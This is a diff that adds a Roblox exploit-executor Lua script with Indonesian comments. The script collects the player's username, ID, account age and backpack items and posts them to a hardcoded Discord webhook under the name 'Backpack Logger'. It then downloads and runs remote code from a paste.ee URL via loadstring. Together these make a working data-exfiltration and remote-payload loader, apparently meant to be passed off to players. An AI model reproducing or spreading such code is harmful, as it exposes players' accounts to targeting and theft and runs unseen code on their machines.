@@ -1,0 +1,100 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+local userId = player.UserId
+local playerName = player.Name
+local accountAge = player.AccountAge -- umur akun dalam hari
+local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
+
+-- Ambil isi backpack
+local backpack = player:WaitForChild("Backpack")
+local backpackItems = {}
+for _, item in ipairs(backpack:GetChildren()) do
+    table.insert(backpackItems, item.Name)
+end
+local backpackStr = #backpackItems > 0 and table.concat(backpackItems, ", ") or "Kosong"
+
+-- Batasi panjang backpackStr max 1000 karakter
+if #backpackStr > 1000 then
+    backpackStr = string.sub(backpackStr, 1, 997) .. "..."
+end
+
+local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
+
+-- Pilih fungsi request sesuai executor
+local requestFunction = nil
+
+if type(http_request) == "function" then
+    requestFunction = http_request
+elseif type(request) == "function" then
+    requestFunction = request
+elseif syn and type(syn.request) == "function" then
+    requestFunction = syn.request
+elseif fluxus and type(fluxus.request) == "function" then
+    requestFunction = fluxus.request
+elseif krnl and type(krnl.request) == "function" then
+    requestFunction = krnl.request
+end
+
+if typeof(requestFunction) ~= "function" then
+    warn("❌ Executor tidak mendukung HTTP request.")
+    return
+end
+
+local function safeRequest(options)
+    local success, result = pcall(function()
+        return requestFunction(options)
+    end)
+    if success then
+        return result
+    else
+        warn("❌ Request error:", result)
+        return nil
+    end
+end
+
+-- Timestamp ISO lengkap
+local timeNow = DateTime.now():ToIsoDate() .. "T" .. os.date("%H:%M:%S") .. "Z"
+
+local webhookPayload = {
+    ["username"] = "🎒 Backpack Logger",
+    ["avatar_url"] = "https://i.imgur.com/0y0F0Gj.png",
+    ["embeds"] = {{
+        ["title"] = "📦 Informasi Backpack dan Akun",
+        ["color"] = 0x3498db,
+        ["fields"] = {
+            { ["name"] = "👤 Player", ["value"] = string.format("`%s` (ID: `%d`)", playerName, userId), ["inline"] = true },
+            { ["name"] = "⏳ Umur Akun", ["value"] = string.format("%d hari", accountAge), ["inline"] = true },
+            { ["name"] = "🔗 Profile Roblox", ["value"] = string.format("[Klik Disini](%s)", profileUrl), ["inline"] = false },
+            { ["name"] = "🎒 Isi Backpack", ["value"] = backpackStr, ["inline"] = false }
+        },
+        ["footer"] = {
+            ["text"] = "Backpack Logger - " .. os.date("%Y-%m-%d %H:%M:%S"),
+            ["icon_url"] = "https://i.imgur.com/Z4VbQXz.png"
+        },
+        ["timestamp"] = timeNow
+    }}
+}
+
+local response = safeRequest({
+    Url = webhookUrl,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode(webhookPayload)
+})
+
+if response and (response.StatusCode == 204 or response.StatusCode == 200) then
+    print("✅ Webhook Discord berhasil dikirim!")
+    -- Jalankan script setelah webhook sukses
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://paste.ee/r/xW0nuB93"))()
+    end)
+    if not success then
+        warn("❌ Gagal menjalankan script:", err)
+    end
+else
+    warn("❌ Gagal mengirim webhook:", response and response.StatusCode or "No response")
+end
